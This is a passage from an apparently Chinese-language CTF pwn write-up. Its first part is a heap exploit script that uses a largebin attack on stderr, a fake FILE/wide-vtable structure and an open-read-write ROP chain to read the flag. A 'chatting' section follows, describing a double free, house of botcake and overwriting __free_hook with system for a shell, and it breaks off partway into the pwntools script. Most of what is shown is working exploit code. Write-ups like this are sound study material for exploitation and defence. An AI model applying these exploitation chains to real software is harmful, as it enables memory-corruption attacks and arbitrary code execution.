</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x418</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span>  <span class="c1"># 2 partial overwrite bk    A-&gt;bk = p</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x418</span><span class="p">,</span><span class="s2">&#34;A&#34;</span><span class="p">)</span>       <span class="c1">#6  c1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># step4 use ub to set bk-&gt;fd</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="c1"># C1</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="c1"># D=P-&gt;bk</span>
</span></span><span class="line"><span class="cl"><span class="c1"># ub-D-C1    D-&gt;FD = C1</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span> <span class="c1"># merge D with H, preserve D-&gt;fd </span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x500</span><span class="o">-</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;6&#39;</span><span class="o">*</span><span class="mh">0x488</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x431</span><span class="p">))</span> <span class="c1">#3 H1. bk-&gt;fd = p, partial write \x00</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x3b0</span><span class="p">,</span><span class="s2">&#34;A&#34;</span><span class="p">)</span> <span class="c1">#5 recovery</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x108</span><span class="p">,</span> <span class="mh">0x100</span><span class="o">*</span><span class="sa">b</span><span class="s1">&#39;4&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x560</span><span class="p">))</span> <span class="c1">#4</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x448</span><span class="p">,</span><span class="s2">&#34;A&#34;</span><span class="p">)</span> <span class="c1">#3 put libc to chunk 4</span>
</span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span><span class="o">=</span><span class="n">uu64</span><span class="p">()</span><span class="o">-</span><span class="mh">0x219ce0</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;libc_base&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span><span class="p">(</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">heap_base</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">rn</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span><span class="o">-</span><span class="mh">0x15f0</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;heap_base&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io_stderr</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x21a860</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span><span class="p">(</span><span class="s2">&#34;io_stderr&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x448</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x219ce0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x431</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x21a0d0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0xc20</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">io_stderr</span><span class="o">-</span><span class="mh">0x20</span><span class="p">))</span> <span class="c1">#3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x608</span><span class="p">,</span><span class="s2">&#34;a&#34;</span><span class="p">)</span> <span class="c1">#6</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">read</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">_IO_wfile_jumps</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_wfile_jumps&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">magic_gadget</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x169e7a</span>
</span></span><span class="line"><span class="cl"><span class="n">syscall_ret</span><span class="o">=</span><span class="n">read</span><span class="o">+</span><span class="mh">0x10</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rax</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x0000000000045eb0</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x000000000002a3e5</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rsi</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x000000000002be51</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdx</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x00000000000796a2</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="mh">0x0000000000029cd6</span>
</span></span><span class="line"><span class="cl"><span class="n">leave_ret</span><span class="o">=</span><span class="mh">0x000000000004da83</span><span class="o">+</span><span class="n">libc_base</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_r12_r15</span><span class="o">=</span><span class="mh">0x000000000002be4c</span><span class="o">+</span><span class="n">libc_base</span>
</span></span><span class="line"><span class="cl"><span class="n">close</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;close&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">read</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">write</span><span class="o">=</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">fake_file_addr</span><span class="o">=</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0xc30</span>
</span></span><span class="line"><span class="cl"><span class="n">wide_data_addr</span><span class="o">=</span><span class="n">fake_file_addr</span><span class="o">+</span><span class="mh">0xd0</span>
</span></span><span class="line"><span class="cl"><span class="n">wide_vtable_addr</span><span class="o">=</span><span class="n">wide_data_addr</span><span class="o">+</span><span class="mh">0xe8</span>
</span></span><span class="line"><span class="cl"><span class="n">rop_addr</span><span class="o">=</span><span class="n">wide_vtable_addr</span><span class="o">+</span><span class="mh">0x70</span>
</span></span><span class="line"><span class="cl"><span class="n">flag_addr</span><span class="o">=</span><span class="n">rop_addr</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_file</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_file</span><span class="o">=</span><span class="n">fake_file</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rop_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_file</span><span class="o">=</span><span class="n">fake_file</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x90</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">wide_data_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">fake_file</span><span class="o">=</span><span class="n">fake_file</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xc8</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">_IO_wfile_jumps</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">wide_data</span><span class="o">=</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xe0</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">wide_vtable_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">wide_vtable</span><span class="o">=</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">magic_gadget</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">orw</span><span class="o">=</span><span class="sa">b</span><span class="s2">&#34;flag</span><span class="se">\x00\x00\x00\x00</span><span class="s2">&#34;</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_r12_r15</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rop_addr</span><span class="o">-</span><span class="mh">0x8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">leave_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">flag_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rax</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">syscall_ret</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">orw</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">rop_addr</span><span class="o">+</span><span class="mh">0x300</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x50</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">read</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">write</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x600</span><span class="p">,</span><span class="s2">&#34;A&#34;</span><span class="p">)</span> <span class="c1">#2</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="n">fake_file</span><span class="o">+</span><span class="n">wide_data</span><span class="o">+</span><span class="n">wide_vtable</span><span class="o">+</span><span class="n">orw</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x418</span><span class="p">,</span><span class="s2">&#34;A&#34;</span><span class="p">)</span> <span class="c1">#8</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x448</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="mi">2</span> <span class="o">|</span> <span class="mh">0x8</span> <span class="o">|</span> <span class="mh">0x800</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="mi">64</span><span class="p">))</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">payload</span><span class="p">)</span> <span class="c1">#3</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0xeec0</span><span class="p">,</span><span class="s2">&#34;A&#34;</span><span class="p">)</span><span class="c1">#9</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0xeec0</span><span class="p">,</span><span class="s2">&#34;A&#34;</span><span class="p">)</span><span class="c1">#10</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x1000</span><span class="o">-</span><span class="mh">0x480</span><span class="p">,</span><span class="s2">&#34;A&#34;</span><span class="p">)</span><span class="c1">#11</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x438</span><span class="p">,</span><span class="s2">&#34;A&#34;</span><span class="p">)</span> <span class="c1">#12</span>
</span></span><span class="line"><span class="cl"><span class="n">delete</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">add</span><span class="p">(</span><span class="mh">0x438</span><span class="p">,</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x438</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">menu</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span><span class="p">(</span><span class="s2">&#34;Size:&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="mh">0x500</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111727.png' alt="image-20231216233836916"></p>
<h3 class="heading-element" id="chatting"><span>chatting</span>
  <a href="#chatting" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><h4 class="heading-element" id="解法一-1"><span>解法一</span>
  <a href="#%e8%a7%a3%e6%b3%95%e4%b8%80-1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h4><p>首先填满0x100的tcache，然后释放当前usrname，使当前用户的message chunk（大小也为0x100） 进入unsorted bin，然后执行read 函数进行泄露libc。</p>
<p>泄露完之后，发现add message 时，如果add message 0x64次后（或者用户名长度大于 0x64），如果再次add会释放当前的message chunk，而如果delete 当前用户就会触发tcahche double free 检测，那么可得知程序中存在double free。</p>
<p>接下来通过构造chunk 结构，利用house of botcake 制造出重叠chunk，然后利用tcache 申请到free_hook 修改其为system，最后释放一个content为&quot;/bin/sh\x00&quot;的chunk 即可getshell</p>
<p><img loading="lazy" src='https://cdn.jsdelivr.net/gh/chuw3i/picodemo@main/img/202505262111728.png' alt="image-20231217171306456"></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span><span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#p=remote(&#34;101.200.122.251&#34;,14509)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./chatting&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#libc=ELF(&#39;./libc-2.27.so&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="p">,</span> <span class="n">data</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">text</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">rn</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span>  <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span> <span class="p">:</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">dbg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">text</span><span class="o">=</span><span class="kc">None</span>  <span class="p">:</span> <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">uu32</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xff</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">4</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">uu64</span> <span class="o">=</span> <span class="k">lambda</span> <span class="p">:</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x7f</span><span class="s2">&#34;</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span> <span class="p">:</span> <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl"><span class="n">pr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">s</span> <span class="p">:</span> <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\033</span><span class="s1">[1;31;40m </span><span class="si">%s</span><span class="s1"> --&gt; 0x</span><span class="si">%x</span><span class="s1"> </span><span class="se">\033</span><span class="s1">[0m&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="nb">eval</span><span class="p">(</span><span class="n">s</span><span class="p">)))</span>
